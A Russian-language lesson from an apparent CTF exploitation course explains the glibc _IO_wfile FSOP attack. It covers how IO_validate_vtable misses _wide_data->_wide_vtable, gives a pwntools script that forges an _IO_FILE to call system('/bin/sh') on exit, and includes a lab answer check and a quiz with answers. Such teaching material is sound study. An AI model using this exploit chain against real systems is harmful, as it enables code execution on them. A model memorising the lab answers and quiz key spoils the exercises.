---
id: pwn-io-wfile
title: "Атака _IO_wfile: wide-потоки и vtable в modern glibc"
category: pwn
parent: pwn-io-file-internals
difficulty: expert
order: 1
tags: [fsop, io-file, wfile, wide-data, vtable, glibc]
prerequisites: [pwn-io-file-internals]
useful_for:
  - "CTF Pwn категория"
  - "Modern glibc exploitation"
  - "Vulnerability research"
estimated_minutes: 50
summary: "Разбираем атаку _IO_wfile: структура _IO_wide_data, путь через _IO_wfile_jumps и захват управления в modern glibc."
lab:
  kind: shell
  title: "Практика: _IO_wfile_jumps и _wide_vtable"
  toolset: [core, elf]
  workdir: /home/student/task
  files: [task.md, libc.syms]
  check: "grep -q 'wfile_jumps=0x1e6228' answer.txt"
  hints:
    - "`IO_validate_vtable` проверяет только первую `vtable` (`_IO_FILE.vtable`)."
    - "У «широкого» потока есть второй уровень: `_wide_data->_wide_vtable`, и он НЕ проверяется."
    - "Цепочка: `_IO_wfile_overflow -> _IO_wdoallocbuf -> _wide_vtable->_IO_doallocate`."
    - "Найди смещение `_IO_wfile_jumps` в libc и запиши `wfile_jumps=0x...`."
---
## Вопрос, с которого всё начинается

В прошлом уроке мы узнали, что `vtable` обязана указывать внутрь легальной таблицы. Значит, «свою» таблицу в куче подставить нельзя. Но тогда как FSOP работает на современной glibc?

Ответ: используют **широкие потоки** (wide streams) и таблицу `_IO_wfile_jumps`. Это самый популярный валидный `vtable`, через который современные эксплойты вызывают произвольную функцию. Разберём, как именно.

## Наш пример

Найдём в целевой libc нужные таблицы и функцию:

```
$ readelf -sW /usr/lib/libc.so.6 | grep -E '_IO_wfile_jumps|_IO_file_jumps|system'
  53b00  system
  1e6030 _IO_file_jumps
  1e6228 _IO_wfile_jumps
```

`_IO_wfile_jumps` лежит на `0x1e6228` — это часть секции `__libc_IO_vtables`, поэтому проверка `IO_validate_vtable` её пропускает. А внутри неё есть нужные нам функции.

## Шаг 1. Чем «широкий» поток отличается от обычного

«Широкий» поток работает не с байтами, а с широкими символами (`wchar_t`). Для этого у него есть дополнительное поле `_wide_data` (смещение `0xa0` в `_IO_FILE`) — указатель на структуру `_IO_wide_data`, у которой, в свою очередь, есть **своя** таблица `_wide_vtable`.

Схема такая:

```
_IO_FILE (0xa0) ──> _IO_wide_data ──> _wide_vtable
```

Это второй уровень косвенности, и именно он даёт атакующему точку контроля.

## Шаг 2. Функция _IO_wfile_overflow

Когда glibc решает сбросить буфер широкого потока, она вызывает `_IO_wfile_overflow`. Внутри, если буфер не выделен, она зовёт `_IO_wdoallocbuf`, а та — функцию из `_wide_vtable`:

```
_IO_wfile_overflow(fp)
   └─ _IO_wdoallocbuf(fp)
        └─ fp->_wide_data->_wide_vtable->_IO_doallocate(fp)
```

Вот она — управляемая точка. Если мы контролируем `_wide_data`, то контролируем `_wide_vtable`, а значит и `_IO_doallocate`. Записав туда `system`, получим вызов `system(fp)`.

## Шаг 3. Почему проверка vtable не мешает

Проверка `IO_validate_vtable` смотрит только на **первую** `vtable` — поле `_IO_FILE.vtable`. Мы указываем её на легальную `_IO_wfile_jumps`, и проверка проходит. А вот `_wide_data->_wide_vtable` **не проверяется** — это отдельный указатель, который мы можем направить куда угодно.

Это и есть суть обхода: легальная `vtable` сверху, произвольная `_wide_vtable` снизу.

## Шаг 4. Собираем цепочку

План эксплойта:

1. Выделяем память под поддельный `_IO_FILE` и поддельный `_IO_wide_data` (например, в куче).
2. В `_IO_FILE.vtable` пишем `_IO_wfile_jumps` (валидно).
3. В `_IO_FILE._wide_data` пишем адрес нашей `_IO_wide_data`.
4. В `_wide_data._wide_vtable` пишем адрес нашей `_wide_vtable`.
5. В позиции `_IO_doallocate` (`_wide_vtable + 0x68`) пишем `system`.
6. В начало `_IO_FILE` кладём строку `"/bin/sh"`.
7. Прицепляем структуру в список `_IO_list_all` и ждём `exit`/`flush`.

При завершении программы `flush` дойдёт до `_IO_wfile_overflow`, спустится по цепочке и вызовет `system("/bin/sh")`.

## Шаг 5. Как выставить _flags

Чтобы `flush` вообще решил, что есть что сбрасывать, `_flags` должен показывать, что поток на запись и в нём есть данные. Практически выставляют бит `_IO_CURRENTLY_PUTTING` (`0x800`) и делают так, чтобы `_IO_write_base < _IO_write_ptr`. Точные значения подбирают в отладчике: `p *(struct _IO_FILE_plus *)stdout`.

## Шаг 6. Варианты и упрощения

Есть несколько способов упростить цепочку:

| Приём | Идея |
|---|---|
| `_IO_wfile_jumps` + `_wide_data` | стандартный современный FSOP |
| `_IO_str_jumps` | вызов функции-аллокатора из структуры (см. `pwn-io-str-overflow`) |
| House of Husk | через `__printf_function_table` |
| `_IO_list_all` напрямую | подмена головы списка потоков |

Выбор зависит от того, что атакующий может контролировать и какая версия glibc на цели.

## Шаг 7. Отладка FSOP

FSOP почти невозможно собрать вслепую. В отладчике:

```
pwndbg> p *(struct _IO_FILE_plus *)_IO_2_1_stdout_
pwndbg> p/x _IO_2_1_stdout_.vtable
pwndbg> x/4gx _IO_2_1_stdout_.vtable
```

Смотри, какие поля ты реально изменил и куда ведёт `vtable`. Убедись, что `_wide_data` указывает на твою структуру, а `_wide_vtable` — на твою таблицу. Один неверный байт — и `flush` уйдёт не туда.

## Полный прогон от начала до конца

Соберём всю цепочку в один скрипт на pwntools. Пусть у нас есть heap-примитив, позволяющий писать по произвольному адресу (например, tcache poisoning из прошлых уроков).

```python
from pwn import *
libc = ELF('./libc.so.6', checksec=False)
wfile = libc.symbols['_IO_wfile_jumps']
system = libc.symbols['system']
heap = leak_heap()                       # адрес нашей подделки в куче

fake_wd  = heap + 0x100                  # _IO_wide_data
fake_wvt = heap + 0x200                  # _wide_vtable

# 1) в _wide_vtable[_IO_doallocate] кладём system
write(fake_wvt + 0x68, p64(system))
# 2) в _IO_wide_data._wide_vtable кладём fake_wvt
write(fake_wd, p64(fake_wvt))
# 3) собираем _IO_FILE
write(heap + 0x00, b'/bin/sh\x00')       # аргумент для system
write(heap + 0x20, p64(0))               # _IO_write_base
write(heap + 0x28, p64(1))               # _IO_write_ptr > base -> есть что flush
write(heap + 0xa0, p64(fake_wd))         # _wide_data
write(heap + 0xd8, p64(wfile))           # валидная vtable
# 4) прицепляем в список потоков
write(libc.symbols['_IO_list_all'], p64(heap))
```

При выходе из программы `exit` обходит `_IO_list_all`, доходит до нашей структуры, вызывает `_IO_wfile_overflow`, и та спускается к `_wide_vtable->_IO_doallocate`, то есть к `system`. Аргументом будет адрес структуры, где лежит `"/bin/sh"`.

## Шаг 8. Почему выбирают именно _IO_wfile_jumps

Есть и другие легальные таблицы, но `_IO_wfile_jumps` удобнее всех, потому что цепочка `_IO_wfile_overflow -> _IO_wdoallocbuf -> _wide_vtable` даёт **управляемый вызов функции с управляемым аргументом**. Через обычную `_IO_file_jumps` такой косвенности нет: её `_IO_overflow` не зовёт пользовательский указатель. Поэтому в CTF последних лет `_IO_wfile_jumps` — почти стандарт.

Ещё один плюс: `_wide_data` и `_wide_vtable` можно расположить в куче, которую мы и так контролируем после tcache poisoning. Не нужны дополнительные утечки стека.

## Если не сработало

Первое: `vtable` не валидна. Если ты указал произвольный адрес, проверка уронит программу с `_IO_vtable_check`. Используй `_IO_wfile_jumps`.

Второе: не сработал `flush`. Проверь `_flags`, `_IO_write_base` и `_IO_write_ptr`.

Третье: структура не в списке. `_IO_list_all` и `_chain` должны вести на подделку.

Четвёртое: не тот аргумент. `system` получит `fp`. Положи `"/bin/sh"` в начало структуры.

Пятое: версия libc. Смещения `_IO_wfile_jumps` и позиции функций зависят от сборки. Бери их из целевой libc, а не из интернета.

Шестое: порядок полей. `_wide_data` лежит на `0xa0`, `vtable` — на `0xd8`. Если перепутать смещение, ты испортишь соседнее поле, и поток сломается ещё до вызова. Сверяйся с дампом `p *(struct _IO_FILE_plus *)stdout` в отладчике.

Седьмое: `_IO_doallocate` должна быть в нужной позиции `_wide_vtable`. У `_IO_wide_data` таблица называется `_wide_vtable`, и позиция `_IO_doallocate` в ней — `0x68`. Запишешь `system` не туда — вызовется другая функция.

## Что мы теперь знаем

- «Широкий» поток использует `_wide_data` (`0xa0`) и вторую таблицу `_wide_vtable`.
- `_IO_wfile_overflow` спускается к `_wide_vtable->_IO_doallocate` — это управляемая точка.
- `IO_validate_vtable` проверяет только первую `vtable`, поэтому `_wide_vtable` можно подделать.
- Легальная `_IO_wfile_jumps` сверху + произвольная `_wide_vtable` снизу = обход проверки.
- Записав `system` в `_IO_doallocate` и `"/bin/sh"` в структуру, получают вызов шелла.

## Квиз

Проверь себя.

```quiz
- question: "Что такое _wide_data у _IO_FILE?"
  options:
    - "Указатель на структуру _IO_wide_data для широких потоков"
    - "Буфер ввода"
    - "Canary"
    - "Счётчик"
  answer: 0
  explanation: "Поле на смещении 0xa0 указывает на _IO_wide_data."
- question: "Почему _IO_wfile_jumps проходит IO_validate_vtable?"
  options:
    - "Она лежит внутри секции __libc_IO_vtables"
    - "Она зашифрована"
    - "Она в куче"
    - "Она read-only"
  answer: 0
  explanation: "Проверка требует, чтобы vtable была внутри легальной секции."
- question: "Какую таблицу НЕ проверяет IO_validate_vtable?"
  options:
    - "_wide_data->_wide_vtable"
    - "_IO_FILE.vtable"
    - "_IO_file_jumps"
    - "_IO_str_jumps"
  answer: 0
  explanation: "Проверяется только первая vtable; вторая остаётся подконтрольной."
- question: "Какую функцию через _wide_vtable подменяют на system?"
  options:
    - "_IO_doallocate"
    - "printf"
    - "read"
    - "malloc"
  answer: 0
  explanation: "_IO_wfile_overflow -> _IO_wdoallocbuf -> _wide_vtable->_IO_doallocate."
- question: "Что должно лежать в начале поддельного _IO_FILE?"
  options:
    - "Строка /bin/sh (system получит fp)"
    - "Canary"
    - "Нули"
    - "Адрес стека"
  answer: 0
  explanation: "system вызывается с указателем на структуру как аргументом."
```

## Куда дальше

В следующем уроке — `pwn-vtable-check-bypass` — мы разберём саму проверку `IO_validate_vtable` изнутри и другие способы её обойти. А пока главное: **проверка vtable смотрит только на первый уровень — `_wide_data` открывает второй, и через него вызывается что угодно.**

## Где пригодится

- **CTF:** FSOP-задачи на glibc 2.35+.
- **Bug bounty:** баги в широких потоках ввода-вывода.
- **Пентест:** обход hardening glibc.
- **Работа:** глубокое понимание libc I/O.
